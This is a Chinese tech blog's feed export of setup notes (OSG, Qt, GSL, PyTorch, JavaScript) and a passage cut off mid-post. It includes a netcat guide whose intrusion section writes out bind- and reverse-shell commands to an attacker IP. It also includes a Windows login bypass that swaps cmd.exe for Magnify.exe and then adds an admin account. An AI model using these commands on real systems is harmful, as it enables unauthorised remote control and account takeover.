    <content type="text"><![CDATA[最近想尝试使用QT开发图形用户界面，OSG负责三维展示的解决方案，于是研究了一下Windows下OSG的编译安装配置，以及在QT中集成OSG的配置过程。过程记录如下： QT+OSG开发环境配置QT+OSG开发环境配置将使用QT Creator集成环境进行图形用户界面开发，使用Desktop Qt 5.9.8 MSVC2017 64构建套件编译链接调试C++程序。 Visual Studio Community 2017 下载安装下载安装Visual Studio Community 2017的“使用C++的桌面开发”工作负载。这将为QT提供MSVC2017 64bit编译套件。 CDB 调试器下载安装没有安装CDB调试器，QT的Desktop Qt 5.9.8 MSVC2017 64构建套件前会出现感叹号，并且使用该构建套件调试时会报“Unable to create a debugging engine”错误。CDB调试器下载安装方法参考QT - OSG 开发环境配置 QT 5.9.8 下载安装QT 5.9.8是 LTS 版本，其下载安装请参考Qt5配置开源GSL数学库。需要注意的是，QT 5.9.8安装过程，选择MSVC2017 64bit编译组件，如图1所示。 图1 QT 5.9.8安装选择MSVC2017 64bit编译组件 cmake下载安装到 cmake 官网下载安装 cmake，用于osg的编译安装。 下载编译安装OSG下载OSG及相关软件Windows平台编译安装OSG需下载从OSG官网以下资料： OpenSceneGraph 3.6.4源代码 OpenSceneGraph-Data-3.4.0，因为找不到3.6.4版本的数据 3rdParty_VS2017_v141_x64_V11_full 配置OSG打开cmake，选择osg源代码路径和osg源代码构建的路径，再点击“configure”按钮，选择Visual Studio 15 2017 Win64编译套件，配置osg如图2所示。 图2 cmake编译osg配置 需要配置的地方主要有： ACTUAL_3rdparty_DIR：配置第三方库的目录 Build_OSG_EXAMPLES：选中即编译安装OSG的示例。 CMAKE_INSTALL_PREFIX：设置OSG的安装目录，通常放到C盘以外的地方，防止因权限问题安装失败。 配置完成后，再持续点击“configure”按钮，知道红色警告消失。然后点击“Generate”按钮生成vs2017工程。 编译OSG在cmake中点击“Open Project”按钮，即使用 VS2017 打开 build 文件夹下的工程，点击：生成 -&gt; 批生成 -&gt; 生成 Debug 和 Release 版本的 All_BUILD 即可。 安装OSG右击解决方案的 Install 项目，点击生成，然后 Debug 平台的库文件就开始安装了，同理选择 Release 平台再重复安装。之后就可以在安装路径中看到编译的库文件了，安装路径由变量CMAKE_INSTALL_PREFIX的配置决定。 配置环境变量OSG官方文档 Windows Compiling with Visual Studio指出，OSG安装完成后需要配置如下环境变量： 12345678OSG_ROOT points to the base of the OSG file structure (the directory that contains include, src etc. subdirectories)OSG_BIN_PATH = %OSG_ROOT%\binOSG_INCLUDE_PATH = %OSG_ROOT%\includeOSG_LIB_PATH = %OSG_ROOT%\libOSG_SAMPLES_PATH = %OSG_ROOT%\share\OpenSceneGraph\binOSG_FILE_PATH = ???\OpenSceneGraph-Data-X.XOPENSCENEGRAPH_VERSION = 3.6.4 PATH 添加：%OSG_ROOT%\bin;%OSG_ROOT%\bin\osgPlugins-%OPENSCENEGRAPH_VERSION%; 这两个是配置 bin 和插件的路径。 OSG测试命令行测试打开 cmd 命令行，输入osgversion，输出当前 osg 版本说明环境变量配置成功了，再来看看能不能导入模型文件，接着键入： 1osgviewer cow.osg 这里可能会提示系统缺少 zlibd.dll，解决方法很简单： 拷贝第三方库的 dll 目录下的 zlib.dll 和 zlibd.dll 到 OSG 安装目录的 bin 目录中。 拷贝第三方库的 lib 目录下的 zlib.dll 和 zlibd.dll 到 OSG 安装目录的 lib 目录中。 这时重新键入上面的命令，就可以看到一头经典的 3D 牛了，说明 OSG 安装成功了。 QT 配置 OSG 库路径新建一个 QT 的控制台项目，编辑 .pro 文件，加入 OSG 库的路径： 123456win32:CONFIG(release, debug|release): LIBS += -L$$PWD/../../../OpenSceneGraph/lib/ -lOpenThreads -losg -losgDB -losgUtil -losgGA -losgViewer -losgTextelse:win32:CONFIG(debug, debug|release): LIBS += -L$$PWD/../../../OpenSceneGraph/lib/ -lOpenThreadsd -losgd -losgDBd -losgUtild -losgGAd -losgViewerd -losgTextdelse:unix: LIBS += -L$$PWD/../../../OpenSceneGraph/lib/ -lOpenThreads -losg -losgDB -losgUtil -losgGA -losgViewer -losgTextINCLUDEPATH += $$PWD/../../../OpenSceneGraph/includeDEPENDPATH += $$PWD/../../../OpenSceneGraph/lib main.cpp 如下： 123456789#include &lt;osgViewer/Viewer&gt;#include &lt;osgDB/ReadFile&gt;int main(int argc, char *argv[])&#123; osgViewer::Viewer viewer; viewer.setSceneData(osgDB::readNodeFile(&quot;cow.osg&quot;)); return viewer.run();&#125; 运行，出来一头 3D 牛，即配置成功。 参考链接 QT - OSG 开发环境配置,by 程序小哥. Qt5配置开源GSL数学库,by jackhuang. Ubuntu16.04编译安装OSG,by jackhuang. Windows Compiling with Visual Studio,by OpenSceneGraph. Visual_Studio_Community_2017离线安装,by jackhuang. Qt-Creator常见问题,by XenonSec. Visual Studio: MSB3073 error exited with code 1,by stackoverflow.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows忘记密码无法登录的解决方案]]></title>
    <url>%2F2019%2F10%2F09%2FWindows%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E6%97%A0%E6%B3%95%E7%99%BB%E5%BD%95%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[突然需要在一台很久不用的Win7计算机上差一点资料，可忘记了登录密码，只能重置密码。过程记录如下： 解决思路借助手头的一张linux live cd，从光盘启动，进入linux系统，然后找到windows系统盘分区，在C:\Windows\System32下，将cmd.exe重命名为Magnify.exe，然后系统重启，登录Windows操作系统，在登录界面中，调用辅助工具放大镜，即打开命令提示符，输入如下命令重置Windows账户密码： 123456// 查看Windows账户net user// 修改Windows账户密码net user Administrator 123456// 重启系统用Administrator账户登录shutdown -r -t 00 或者采用如下命令新建登录账户：123456// 创建用户net user test 123456 /add// 用户提权，加入管理员组net localgroup Administrators test /add// 使用完删除用户net user test /delete 参考链接 关闭windows默认共享,by Blue_sky90.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qt5配置开源GSL数学库]]></title>
    <url>%2F2019%2F10%2F07%2FQt5%E9%85%8D%E7%BD%AE%E5%BC%80%E6%BA%90GSL%E6%95%B0%E5%AD%A6%E5%BA%93%2F</url>
    <content type="text"><![CDATA[GNU科学库（英语：GSL - GNU Scientific Library），是一套为 C语言和 C++开发者提供的数值计算函数库，多用于应用数学和科学。软件属于自由软件，在 GNU 通用公共许可证下发布。 这套数值计算函数库提供了大量的数学运算功能，比如随机数生成器，特殊函数以及最小二乘拟合。有超过1000个函数包含在该数值计算库和扩展的测试包中。 下面介绍在Qt5环境中搭载GSL库的方法和步骤。 下载并安装Qt5下载Qt5请参考Qt下载（多种下载通道+所有版本）。将下载并安装Qt5.9.8 LTS。 安装Qt5请参考图解Qt安装（Windows平台）。 环境配置MinGW环境配置MinGW（Minimalist GNU for Windows），又称mingw32，是将GCC编译器和GNU Binutils移植到Win32平台下的产物，包括一系列头文件（Win32API）、库和可执行文件。 另有可用于产生32位及64位Windows可执行文件的MinGW-w64项目，是从原本MinGW产生的分支。如今已经独立发展。 MinGW是从Cygwin（1.3.3版）基础上发展而来。Qt5.9.8使用MinGW 5.3编译器编译程序。 将mingw的bin目录添加进系统的环境变量，告诉系统已经安装了mingw编译器，并且可以被使用。Qt5自带的mingw的安装路径为C:\Qt\Qt5.9.8\5.9.8\mingw53_32，这里我们需要将C:\Qt\Qt5.9.8\5.9.8\mingw53_32\bin目录添加进入系统环境变量。 系统环境变量的设置方法为：【计算机】-&gt;【属性】-&gt;【高级系统设置】-&gt;【环境变量】-&gt;【系统变量】-&gt;【Path】。 MSYS环境配置MSYS是bash，make，gawk和grep等GNU实用程序的集合，以允许构建依赖于传统UNIX工具的应用程序和程序。 它旨在补充MinGW和cmd shell的缺陷。 一个示例是构建一个使用自动工具构建系统的库。 用户通常会先运行“ ./configure”，然后运行“ make”来构建它。 配置外壳程序脚本需要Windows系统上不存在的外壳程序脚本解释器，但由MSYS提供。 一个常见的误解是MSYS是“ Windows上的UNIX”，MSYS本身不包含编译器或C库，因此不能将UNIX程序神奇地移植到Windows上，也不能提供任何特定于UNIX的功能，例如case- 敏感文件名。 寻找此类功能的用户应改用Cygwin或Microsoft的Interix。 msys的下载网址为： msys+7za+wget+svn+git+mercurial+cvs-rev13.7z 上述网址给出的是一个压缩包，直接解压就可以使用。 将msys+7za+wget+svn+git+mercurial+cvs-rev13.7z解压到C:\Qt\Qt5.9.8\5.9.8\mingw53_32。 仅将msys解压后并不能直接使用，因为对于msys而言，它还不知道mingw编译器所处位置，因此需要对msys的环境进行配置。首先需要在msys的路径下创建一个名为mingw的空文件夹，路径为C:\Qt\Qt5.9.8\5.9.8\mingw53_32\msys\mingw。然后修改C:\Qt\Qt5.9.8\5.9.8\mingw53_32\msys\etc\fstab中的内容,如下所示。 1C:/Qt/Qt5.9.8/Tools/mingw530_32 /mingw 通过上述环境配置，当启动msys时，将Qt5的mingw编译直接挂载到/mingw目录下。 双击msys文件夹下msys.bat即可运行msys，使用cd命令进入/mingw目录下，我们就会发现此目录下文件就是C:\Qt\Qt5.9.8\Tools\mingw530_32对应的文件。 跳转到gsl-2.6文件夹，即可开始编译链接gsl。 下载并编译安装GSL从此处 http://ftpmirror.gnu.org/gsl/ 下载最新的GSL-2.6。然后采用如下步骤编译GSL： 运行msys，进入GSL源文件所在目录 ./configure make -j8 make install Qt调用GSL库创建Qt工程为了测试GSL数学库能够在Qt环境中运行，新建一个控制台工程进行测试。 新建控制台应用程序的步骤为：【Welcome】-&gt;【New Project】-&gt;【Application】-&gt;【Qt Console Application】-&gt;【Choose】-&gt;【将工程命名为GslTest】。 引用GSL库在GslTest项目的工程目录内，新建名为gsl的文件夹。该文件夹的内容如图1所示。 图1 gsl文件夹结构 gsl文件夹下lib、include、bin中内容为编译安装GSL过程中生成的头文件、库文件及生成的相关exe文件，主要从C:\Qt\Qt5.9.8\5.9.8\mingw53_32\msys路径下提取。 此外，在gsl目录下新建gsl.pro文件，其内容如下： 12345# 宏定义项，指明采用GSL，因为有些函数需要使用dllDEFINES += GSL_DLLINCLUDEPATH += $$PWD\includeLIBS += -L$$PWD\lib -llibgslLIBS += -L$$PWD\lib -llibgslcblas 然后在GslTest的项目文件GslTest.pro末尾引用gsl.pro文件，如下所示。 1include($$PWD/gsl/gsl.pro) 修改GslTest的main.cpp1234567891011121314#include &lt;QCoreApplication&gt;#include &lt;gsl/gsl_sf_bessel.h&gt;#include &lt;math.h&gt;#include &lt;iostream&gt;int main(int argc, char *argv[])&#123; QCoreApplication a(argc, argv); double x=10.0; double y=gsl_sf_bessel_J0(x); std::cout&lt;&lt;&quot;J0(&quot;&lt;&lt;x&lt;&lt;&quot;)=&quot;&lt;&lt;y&lt;&lt;std::endl; return a.exec();&#125; 运行GslTest 图2 GslTest运行结果 参考链接 Qt下载（多种下载通道+所有版本）,by C语言中文网. 图解Qt安装（Windows平台）,by C语言中文网. GSL - GNU Scientific Library,by gnu. QT5环境下配置GSL数学库,by 木小猿. GNU科学库,by wikipedia. 【ICPC-455】C++ 常用数学函数库,by 陈国林. MinGW,by wikipedia. MinGW和MSYS区别和关系以及MinGW&amp;MSYS在Win7中安装并编译x264,by FreeApe. 最强数学库GSL(GNU Scientific Library) Qt环境下部署,by 尘中远. Qt5.9.6使用MSVC（VS2017）开发环境搭建,by KirkSong. QT - OSG 开发环境配置,by 程序小哥. GSL with CMake build support,by ampl. 在Visual Studio中使用GNU Scientific Library (GSL),by NULL_BOT.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++多继承的优缺点]]></title>
    <url>%2F2019%2F10%2F05%2FCPlusPlus%E5%A4%9A%E7%BB%A7%E6%89%BF%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9%2F</url>
    <content type="text"><![CDATA[C++中子类可继承多个父类。多继承对父类的个数没有限制，继承方式可以是公共继承、保护继承和私有继承，不写继承方式，默认是private继承。C++多继承语法非常灵活，使用得当可极大提高编程效率，但同时不能其潜在的缺点： 如果一个类继承多个父类，如果父类中的方法名如果相同，那么就会产生歧义。 如果父类中的方法同名，子类中没有覆盖，同样会产生上面的错误。 针对上述缺点，C#和Java中都不支持类多继承，而是使用类单继承和接口多继承设计替代类多继承。 参考链接 论C#之多继承,by Leo. 接口和抽象类有什么区别？,by zhihu. java类单继承，接口多继承设计的原因,by xiaoxiang-chen. C++学习之继承篇（多继承与多重继承）,by hudfang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GUI开发方案总结]]></title>
    <url>%2F2019%2F10%2F03%2FGUI%E5%BC%80%E5%8F%91%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[最近调研GUI开发技术，对相关资料总结一下。 Windows 下的 GUI 库Windows 下的 GUI 解决方案比较多： 基于 C++ 的有 Qt、MFC、WTL、wxWidgets、DirectUI、Htmlayout； 基于 C# 的有 WinForm、WPF； 基于 Java 的有 AWT、Swing； 基于 Pascal 的 有Delphi； 基于Go语言的有 walk 和 electron； 还有国内初露头角的 aardio； Visual Basic 曾经很流行，现在逐渐失去了色彩； 如果你有 Web 开发经验，也可以基于 Webkit 或 Chromium 将网页转换为桌面程序。 没有哪一种方案能够独霸 Windows，使用比较多的编程语言是 C++、C#、Java。 Linux 下的 GUI 库Linux 下常用的 GUI 库有基于 C++ 的 Qt、GTK+、wxWidgets，以及基于 Java 的 AWT 和 Swing。其中最著名的就是 Qt 和 GTK+：KDE 桌面系统已经将 Qt 作为默认的 GUI 库，Gnome 桌面系统也将 GTK+ 作为默认的 GUI 库。 参考链接 Qt和其它GUI库的对比,by C语言中文网. Qt,by wikipedia. Qt下载（多种下载通道+所有版本）,by C语言中文网. Qt镜像站下载,by 中科大镜像站.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VS2017打包Windows桌面程序]]></title>
    <url>%2F2019%2F09%2F26%2FVS2017%E6%89%93%E5%8C%85Windows%E6%A1%8C%E9%9D%A2%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[Microsoft Visual Studio 2017 Installer Projects是一个易于发布 VS 项目的官方插件，下面简要介绍该插件的使用。 安装插件VS 工具栏 &gt; 工具 &gt; 扩展和更新 &gt; 联机 &gt; 搜索 Microsoft Visual Studio 2017 Installer Projects 并安装。安装完成后需要重启 VS。 添加 Setup Project打开VS2017，新建Setup Project。 配置安装项目设置Setup Project选中添加的Setup Project，配置其属性。比较重要的属性有： key val Author 一般填公司名，会使用其作为软件安装目录名 Localization 指定软件运行地语种，如果你的软件是多语言的话 TargetPlatform 指定软件目标平台 x86 or x64 Version 发布版本号 桌面快捷方式开始菜单快捷方式设置快捷方式Icon生成安装文件.msi参考链接 Microsoft Visual Studio 2017 Installer Projects,by SkyRiN. Vistual Studio Community 2017 30天许可证过期,by 井底一蛤蟆.]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows下安装Pytorch过程记录]]></title>
    <url>%2F2019%2F09%2F24%2FWindows%E4%B8%8B%E5%AE%89%E8%A3%85Pytorch%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[PyTorch是一个开源的Python机器学习库，基于Torch，底层由C++实现，应用于人工智能领域，如自然语言处理。它最初由Facebook的人工智能研究团队开发，并且被用于Uber的概率编程软件Pyro。 PyTorch主要有两大特征： 类似于NumPy的张量计算，可使用GPU加速; 基于带自动微分系统的深度神经网络; 下面记录在Windows操作系统下安装PyTorch的方法。 安装Anaconda到Anaconda Distribution下载合适的Anaconda。 查看cuda版本参考Windows系统查看CUDA版本号。例如本机cuda版本为9.2。 安装pytorch进入pytorch官网的GET STARTED，根据自身计算机环境，选择PyTorch Build、Your OS、Package、Language和CUDA，即得到安装pytorch的命令： 1234// 基于Anacondaconda install pytorch torchvision cudatoolkit=9.2 -c pytorch -c defaults -c numba/label/dev// 基于Python3.6pip3 install torch==1.2.0+cu92 torchvision==0.4.0+cu92 -f https://download.pytorch.org/whl/torch_stable.html pip安装whl包torch1.2的包很大，直接用pip安装下载很慢，可以先用下载工具将torch1.2的whl下载下来，再直接安装。 1pip3 install torch-1.2.0+cu92-cp36-cp36m-win_amd64.whl 验证打开命令提示符，输入： 1python 输入如下代码，查看输出： 1234from __future__ import print_functionimport torchx = torch.rand(5, 3)print(x) 输出类似如下结果： 12345tensor([[0.3380, 0.3845, 0.3217], [0.8337, 0.9050, 0.2650], [0.2979, 0.7141, 0.9069], [0.1449, 0.1132, 0.1375], [0.4675, 0.3947, 0.1426]]) 输入如下代码，验证GPU驱动和CUDA是安装正确，能够被PyTorch访问： 12import torchtorch.cuda.is_available() 参考链接 CUDA,by wikipedia. Windows 下安装Pytorch,by Big_quant. Windows系统查看CUDA版本号,by 潇洒坤. PyTorch,by wikipedia. GET STARTED,by pytorch. Getting Started with Python in VS Code,by visualstudio.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS如何从ArrayBuffer中解码字符串]]></title>
    <url>%2F2019%2F09%2F24%2FJS%E5%A6%82%E4%BD%95%E4%BB%8EArrayBuffer%E4%B8%AD%E8%A7%A3%E7%A0%81%E5%AD%97%E7%AC%A6%E4%B8%B2%2F</url>
    <content type="text"><![CDATA[最近遇到一个问题，拿到一个ArrayBuffer，知道它是以gb2312编码的文档，那么如何使用javascript从中解码出字符串。下面介绍常用的解决方案。 基础知识字符编码字符编码（英语：Character encoding）、字集码是把字符集中的字符编码为指定集合中某一对象（例如：比特模式、自然数序列、8位组或者电脉冲），以便文本在计算机中存储和通过通信网络的传递。常见的例子包括将拉丁字母表编码成摩斯电码和ASCII。其中，ASCII将字母、数字和其它符号编号，并用7比特的二进制来表示这个整数。通常会额外使用一个扩充的比特，以便于以1个字节的方式存储。 因此，如果不知道字符存储的编码方案，那么只能得到一堆无意义的数字，无法从中解码出正确的字符信息。 ArrayBufferArrayBuffer对象、TypedArray对象、DataView对象是JavaScript操作二进制数据的一个接口。这些对象早就存在，属于独立的规格，ES6将它们纳入了ECMAScript规格，并且增加了新的方法。 这些对象原始的设计目的，与WebGL项目有关。所谓WebGL，就是指浏览器与显卡之间的通信接口，为了满足JavaScript与显卡之间大量的、实时的数据交换，它们之间的数据通信必须是二进制的，而不能是传统的文本格式。文本格式传递一个32位整数，两端的JavaScript脚本与显卡都要进行格式转化，将非常耗时。这时要是存在一种机制，可以像C语言那样，直接操作字节，将4个字节的32位整数，以二进制形式原封不动地送入显卡，脚本的性能就会大幅提升。 二进制数组就是在这种背景下诞生的。它很像C语言的数组，允许开发者以数组下标的形式，直接操作内存，大大增强了JavaScript处理二进制数据的能力，使得开发者有可能通过JavaScript与操作系统的原生接口进行二进制通信。 二进制数组由三个对象组成。 ArrayBuffer对象：代表内存之中的一段二进制数据，可以通过“视图”进行操作。“视图”部署了数组接口，这意味着，可以用数组的方法操作内存。 TypedArray对象：用来生成内存的视图，通过9个构造函数，可以生成9种数据格式的视图，比如Uint8Array（无符号8位整数）数组视图, Int16Array（16位整数）数组视图, Float32Array（32位浮点数）数组视图等等。 DataView对象：用来生成内存的视图，可以自定义格式和字节序，比如第一个字节是Uint8（无符号8位整数）、第二个字节是Int16（16位整数）、第三个字节是Float32（32位浮点数）等等。 简单说，ArrayBuffer对象代表原始的二进制数据，TypedArray对象代表确定类型的二进制数据，DataView对象代表不确定类型的二进制数据。它们支持的数据类型一共有9种（DataView对象支持除Uint8C以外的其他8种）。 解决方案UTF-16的编码解码下面的解决方案只能解码UTF-16编码的字符串，而且当ArrayBuffer的长度过大时，会报“ Maximum call stack size exceeded”的错误。 123456789101112function ab2str(buf) &#123; return String.fromCharCode.apply(null, new Uint16Array(buf));&#125;function str2ab(str) &#123; var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char var bufView = new Uint16Array(buf); for (var i=0, strLen=str.length; i &lt; strLen; i++) &#123; bufView[i] = str.charCodeAt(i); &#125; return buf;&#125; gb2312解码下面的解决方案能解码指定编码的字符串，包括utf-8，utf-16, iso-8859-2, koi8, cp1261, and gbk等。 12345function ab2str(arrayBuf, encodeType) &#123; var decoder = new TextDecoder(encodeType) var u8arr = new Uint8Array(arrayBuf) return decoder.decode(u8arr)&#125; 参考链接 How to convert ArrayBuffer to and from String,by Renato Mangini. 字符编码,by wikipedia. Converting arraybuffer to string : Maximum call stack size exceeded,by stackoverflow. “RangeError: Maximum call stack size exceeded” Why?,by stackoverflow. TextDecoder,by mozilla. String.fromCharCode(),by mozilla. 二进制数组,by 阮一峰. ArrayBuffer,by 阮一峰.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[netcat使用方法简介]]></title>
    <url>%2F2019%2F09%2F22%2Fnetcat%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[netcat（通常缩写为nc）是一种计算机联网实用程序，用于使用TCP或UDP读写网络连接。 该命令被设计为可靠的后端，可以直接使用或由其他程序和脚本轻松驱动。 同时，它是功能丰富的网络调试和调查工具，因为它可以产生用户可能需要的几乎任何类型的连接，并具有许多内置功能。netcat被称为网络工具中的瑞士军刀，体积小巧，但功能强大。 使用帮助 选项 是否有“选项值” 说明 h NO 输出 nc 的帮助 v NO 在网络通讯时，显示详细的输出信息。注：建议新手多用该选项，出错时帮你诊断问题 n NO 对命令行中的“主机”，【不】进行域名解析。注：如果“主机”是“点分格式”的 IP 地址，需要用该选项；如果“主机”是“域名”形式，【不能】用该选项 p YES 指定“端口号” l NO 开启“监听模式”，nc 作为【服务端】。注：如不加该选项，nc 默认作为客户端 u NO 使用 UDP 协议。注：如不加该选项，默认是 TCP 协议 w YES 设置连接的超时间隔（N 秒） q YES 让 nc 延时（N 秒）再退出 z NO 开启“zero-I/O 模式”。注：该选项仅用于“端口扫描”，后面会聊到 k NO 配合 -l 选项使用，可以重复接受客户端连接。注：“原版 nc”的该选项用来开启“TCP keepalive”。这是“原版 nc”与“OpenBSD 变种”之间的差异之一 X YES 指定代理的类型（具体用法，后面会聊到）。注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一 x YES 以 IP:port 的格式指定代理的位置。注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一 e YES 启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】。注：通常用该选项开启一个网络后门。“OpenBSD 变种”基于安全考虑，已去掉该选项，但还是能用间接的方式达到同样的效果。 典型示例网络诊断测试某个远程主机的【监听】端口是否可达用如下命令可以测试某个 IP 地址（x.x.x.x）上的某个监听端口（xx）是否开启。 12nc -nv x.x.x.x xxnc -nv -w 3 x.x.x.x xx 上述命令用到了如下几个选项： 选项 -v 如果你是 nc 的新手，建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。 选项 -n 由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。 选项 -w 在测试链接的时候，如果你【没】使用 -w 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。 如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“-w 选项”，设置一个比较小的超时值。 判断防火墙是否“允许 or 禁止”某个端口在“主机S”上运行 nc，让它在 8080 端口，命令如下： 1nc -lv -p 8080 然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达。 1nc -nv x.x.x.x xx 选项 -l 这个选项会让 nc 进入监听模式。 选项 -p 这个选项有“选项值”，也就是具体端口号。 选项 -k 在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。 如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 -k 选项。 选项 -u 如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 -u 选项。 渗透测试用 nc 进行“端口扫描”下面这个命令，用来扫描 IP 地址为 x.x.x.x 的主机，扫描的端口范围从 1 到 1024。 12nc -znv x.x.x.x 1-1024nc -znv x.x.x.x 1-1024 2&gt;&amp;1 | grep succeeded 选项 -z 意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。 选项 -n 选项 -v 由于“-v 选项”产生的输出位于【stderr】，上述命令中的 2&gt;&amp;1 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）。 grep 命令用来进行【过滤】。对于 Windows 系统，默认【没有】grep 命令，需改用 find 命令过滤。 网络配置基于 nc 的端口转发（Port Forward）用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。 运行下面命令之后，就可以把本机的 1235 端口重定向到本机的 5678 端口。12mkfifo nc_pipenc -l -p 1234 &lt; nc_pipe | nc 127.0.0.1 5678 &gt; nc_pipe 系统管理用 nc 传输文件假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2 你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号） 1nc -l -p xxx &gt; file2 然后在【发送端】（A 主机）运行如下命令。 1nc x.x.x.x xxx &lt; file1 第二条命令中的 xxx 是端口号，要与第一条命令中的端口号相同；第二条命令中的 x.x.x.x 是【主机 B】的 IP 地址。 用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录…”而言） 用 nc 远程备份整个磁盘你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号） 1nc -l -p xxx | dd of=/dev/sdb 然后在【发送端】（A 主机）运行如下命令。 1dd if=/dev/sda | nc x.x.x.x xxx 网络入侵用 nc 开启【被动】连接型后门 在受害者机器上开启后门 12nc.exe -l -p xxx -e cmd.exenc -l -p xxx -e /bin/sh 后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。 防范措施 NAT 模式的虚拟机（Guest OS） NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。 在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】。 用 nc 开启【主动】连接型后门 攻击者在自己机器上运行“服务端 nc” 123nc -lk -p xxxnc.exe -e cmd.exe x.x.x.x xxxnc -e /bin/sh x.x.x.x xxx （在上述两个命令中， xxx 是步骤1用到的端口号，x.x.x.x 是攻击者的 IP 地址） 防范措施 【隔离模式】的虚拟机 【主动】连接型后门的优势之处 简单对比一下“后门的两种连接方式”。 可用性 如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。相比之下，“主动型后门”就【没有】这种弊端。 隐蔽性 “被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。相比之下，“主动型后门”就【没有】这个问题。 参考链接 netcat,by wikipedia. NetCat使用指南,by Evilwing.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库表主键设计方法]]></title>
    <url>%2F2019%2F09%2F20%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E4%B8%BB%E9%94%AE%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[数据库表主键使用自增整型字段还是使用GUID字段，这是一个问题。下面详细分析它们的优劣。 基础知识数据库设计范式 第一范式（1NF）：强调的是列的原子性，即列不能够再分成其他几列。简而言之，第一范式就是无重复的列 第二范式（2NF）：首先要满足它是1NF，另外还需要包含两部分内容：一是表必须有一个主键；二是没有包含在主键中的列必须完全依赖于主键，而不能只依赖于主键的一部分。简而言之，第二范式就是非主属性非部分依赖于主关键字 第三范式（3NF）：首先是 2NF，另外非主键列必须直接依赖于主键，不能存在传递依赖。即不能存在：非主键列 A 依赖于非主键列 B，非主键列 B 依赖于主键的情况。简而言之，第三范式（3NF）要求一个数据库表中不包含已在其它表中已包含的非主关键字信息。 反范式主键的设计原则 主键应当是对用户没有意义的。业务上的‘主键’可以通过唯一键（Unique Key）或唯一索引（Unique Index）和其它约束条件实现 主键应该是单列的，以便提高连接和筛选操作的效率 不要更新主键。实际上，因为主键除了惟一地标识一行之外再没有其他的用途了，所以也就没有理由去对它更新。 主键不应包含动态变化的数据，如时间戳、创建时间列、修改时间列等 主键应当由计算机自动生成。 数据库表主键设计方法数据库表主键设计主要有自增整型字段和使用GUID字段两种方法。 自增整型字段作为主键最常用的主键设计方法。例如《阿里 Java 